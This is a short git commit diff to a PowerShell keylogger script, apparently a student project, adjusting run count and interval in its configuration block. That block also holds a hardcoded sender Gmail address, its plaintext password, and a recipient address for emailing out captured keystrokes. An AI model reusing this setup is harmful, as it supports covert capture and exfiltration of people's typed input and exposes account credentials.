dfc5622e550eb182423f725c6f24f2a52ed3a265
annisadwiayu <47625748+annisadwiayu@users.noreply.github.com>
2020-06-16 21:37:14 +0700

    Update Keylogger.ps1

--- Keylogger.ps1
+++ Keylogger.ps1
@@ -1,6 +1,6 @@
 # Edit only this section!
-$TimesToRun = 1
-$RunTimeP = 5
+$TimesToRun = 2
+$RunTimeP = 1
 $From = "annisadwiayur@gmail.com"
 $Pass = "tugasakhir"
 $To = "tugasakhir.annisa@gmail.com"
